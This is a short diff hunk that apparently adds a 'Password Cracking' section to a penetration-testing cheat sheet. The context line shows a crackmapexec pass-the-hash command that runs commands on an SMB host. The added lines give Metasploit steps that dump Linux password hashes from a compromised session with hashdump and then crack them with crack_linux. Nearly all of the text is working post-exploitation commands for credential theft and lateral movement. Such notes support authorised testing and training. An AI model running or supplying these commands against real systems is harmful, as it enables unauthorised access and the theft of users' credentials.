@@ -272,6 +272,18 @@ crackmapexec smb IP -u Username -H "NTLMHASH" -x "commands"
 
 
 
+# Password Cracking
+```
+msfconsole
+use post/linux/gather/hashdump
+set SESSION 1
+exploit
+
+crack Password 
+use auxiliary/analyze/crack_linux
+set SHA512 true
+run
+```
 
 
 
